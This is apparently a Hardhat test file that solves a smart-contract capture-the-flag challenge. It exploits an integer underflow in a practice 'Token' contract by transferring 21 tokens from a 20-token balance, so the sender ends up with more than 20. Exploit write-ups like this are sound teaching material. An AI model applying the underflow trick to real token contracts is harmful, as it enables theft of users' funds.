// Goal
// Start with 20 tokens and then manage the contract to get more.

import { ContractFactory, Signer } from "ethers"
import { Token } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Token', function () {
  let Token: ContractFactory
  let token: Token

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    Token = await ethers.getContractFactory('Token')
    token = (await Token.deploy(20)) as Token

    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]
  })

  it('Should get more tokens', async function () {
    await token.transfer(ethers.constants.AddressZero, 21)
    const balance = await token.balanceOf(await owner.getAddress())
    expect(balance.gt(20)).to.be.true
  })
})
